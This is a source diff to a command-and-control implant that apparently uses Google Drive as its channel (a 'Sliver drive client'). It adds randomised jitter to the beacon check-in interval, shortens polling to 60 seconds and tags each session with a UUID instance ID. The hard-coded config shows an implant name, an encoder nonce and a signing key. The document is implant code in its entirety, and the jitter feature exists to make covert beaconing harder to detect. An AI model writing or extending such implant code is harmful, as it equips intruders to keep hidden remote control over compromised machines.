@@ -311,6 +311,17 @@ VOID FreeDriveConfig
 	}
 }
 
+DWORD GetNextCheckIn
+(
+	_In_ PSLIVER_DRIVE_CLIENT pSliverClient
+)
+{
+	DWORD dwJitterDuration = 0;
+
+	dwJitterDuration = GenRandomNumber32(0, pSliverClient->dwJitter);
+	return pSliverClient->dwPollInterval + dwJitterDuration;
+}
+
 PSLIVER_DRIVE_CLIENT DriveClientInit()
 {
 	LPSTR lpProxy = NULL;
@@ -334,7 +345,8 @@ PSLIVER_DRIVE_CLIENT DriveClientInit()
 	CHAR szServerMinisignPubkey[] = "untrusted comment: minisign public key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+fgv4PeSONGudrNMT8vzWQowzTfGwXlEvbGgKWSYamy2";
 	UINT64 uEncoderNonce = 6979;
 	CHAR szSliverClientName[32] = "ELDEST_ECONOMICS";
-	DWORD dwPollInterval = 60 * 5;
+	DWORD dwPollInterval = 60;
+	DWORD dwJitter = 30;
 	// END -------------------------------------------------------------------------------
 
 	// Google Drive Config
@@ -352,6 +364,7 @@ PSLIVER_DRIVE_CLIENT DriveClientInit()
 	pResult->lpPeerPubKey = DuplicateStrA(szPeerPubKey, 0);
 	pResult->lpPeerPrivKey = DuplicateStrA(szPeerPrivKey, 0);
 	pResult->dwPollInterval = dwPollInterval;
+	pResult->dwJitter = dwJitter;
 	pTemp = GenRandomBytes(8);
 	memcpy(&pResult->uPeerID, pTemp, 8);
 	pResult->lpServerMinisignPublicKey = DuplicateStrA(szServerMinisignPubkey, 0);
@@ -409,6 +422,7 @@ PSLIVER_DRIVE_CLIENT DriveSessionInit()
 	CHAR szName[0x80];
 	CHAR szPattern[0x80];
 	LPSTR lpRespFileId = NULL;
+	LPSTR lpUuidV4 = NULL;
 
 	pSliverClient = DriveClientInit();
 	if (pSliverClient == NULL) {
@@ -450,6 +464,8 @@ PSLIVER_DRIVE_CLIENT DriveSessionInit()
 	}
 
 	memcpy(pSliverClient->szSessionID, lpSessionId, cbSessionId);
+	lpUuidV4 = GenerateUUIDv4();
+	lstrcpyA(pSliverClient->szInstanceID, lpUuidV4);
 	IsOk = TRUE;
 CLEANUP:
 	if (!IsOk) {
@@ -459,6 +475,10 @@ CLEANUP:
 
 	if (lpRespData != NULL) {
 		FREE(lpRespData);
+	}
+
+	if (lpUuidV4 != NULL) {
+		FREE(lpUuidV4);
 	}
 
 	if (pResp != NULL) {
